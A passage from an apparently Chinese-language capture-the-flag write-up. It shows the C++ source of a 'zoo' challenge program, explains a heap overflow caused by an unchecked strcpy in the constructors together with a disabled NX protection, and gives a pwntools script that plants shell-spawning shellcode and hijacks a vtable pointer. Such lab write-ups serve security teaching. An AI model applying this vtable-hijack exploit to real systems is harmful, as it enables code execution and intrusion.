            cout <<"Meow ~ Meow ~ Meow ~" << endl ;
        }
        virtual void info(){
            cout <<"|---------------------|" << endl ;
            cout <<"| Animal info         |" << endl;
            cout <<"|---------------------|" << endl;
            cout <<"  Weight :"<< this->weight << endl ;
            cout <<"  Name : "<< this->name << endl ;
            cout <<"|---------------------|" << endl;
        }

};

vector<Animal *> animallist ;

void menu(){
    cout <<"*********************************" << endl ;
    cout <<" 1. Add a dog                    " << endl ;
    cout <<" 2. Add a cat                    " << endl ;
    cout <<" 3. Listen a animal              " << endl ;
    cout <<" 4. Show a animal info           " << endl ;
    cout <<" 5. Remove a animal              " << endl ;
    cout <<" 6. Exit                         " << endl ;
    cout <<"*********************************" << endl ;
}


void adddog(){
    string name ;
    int weight ;
    cout <<"Name : " ;
    cin >> name;
    cout <<"Weight : " ;
    cin >> weight ;
    Dog *mydog = new Dog(name,weight);
    animallist.push_back(mydog);

}

void addcat(){
    string name ;
    int weight ;
    cout <<"Name : " ;
    cin >> name;
    cout <<"Weight : " ;
    cin >> weight ;
    Cat *mycat = new Cat(name,weight);
    animallist.push_back(mycat);

}

void remove(){
    unsigned int idx ;
    if(animallist.size() == 0){
        cout <<"no any animal!" << endl ;
        return ;
    }
    cout <<"index of animal : ";
    cin >> idx ;
    if(idx>= animallist.size()){
        cout <<"out of bound !" << endl;
        return ;
    }
    delete animallist[idx];
    animallist.erase(animallist.begin()+idx);


}

void showinfo(){
    unsigned int idx ;
    if(animallist.size() == 0){
        cout <<"no any animal!" << endl ;
        return ;
    }
    cout <<"index of animal : ";
    cin >> idx ;
    if(idx>= animallist.size()){
        cout <<"out of bound !" << endl;
        return ;
    }
    animallist[idx]->info();

}

void listen(){
    unsigned int idx ;
    if(animallist.size() == 0){
        cout <<"no any animal!" << endl ;
        return ;
    }
    cout <<"index of animal : ";
    cin >> idx ;
    if(idx>= animallist.size()){
        cout <<"out of bound !" << endl;
        return ;
    }
    animallist[idx]->speak();

}
int main(void){
    unsigned int choice ;
    setvbuf(stdout,0,2,0);
    setvbuf(stdin,0,2,0);
    cout <<"Name of Your zoo :" ;
    read(0,nameofzoo,100);
    while(1){
        menu();
        cout <<"Your choice :";
        cin >> choice ;
        cout << endl ;
        switch(choice){
            case 1 :
                adddog();
                break ;
            case 2 :
                addcat();
                break ;
            case 3 :
                listen();
                break ;
            case 4 :
                showinfo();
                break ;
            case 5 :
                remove();
                break ;
            case 6 :
                _exit(0);
            default :
                cout <<"Invaild choice" << endl;
                break ;
        }
    }
    return 0 ;
}
```

在 `Dog` 和 `Cat` 的构造函数中存在未检查长度的 `strcpy`，因此可以堆溢出。同时，本题关闭了 NX，而 `Dog` 中存在虚表指针，因此可以将其覆盖为 **shellcode 地址的地址**。那么 shellcode 和 shellcode 地址分别在哪呢？我们可以在程序第一次输入时布置 shellcode，在后面跟上 shellcode 所在地址。

```py
name = 0x605420
shellcode = asm(shellcraft.sh())
sla('zoo',shellcode+p64(name))

add()
add()
free(0)
add('a'*72+p64(name+len(shellcode)))
sla('choice :',3)
sla(':',0)
```
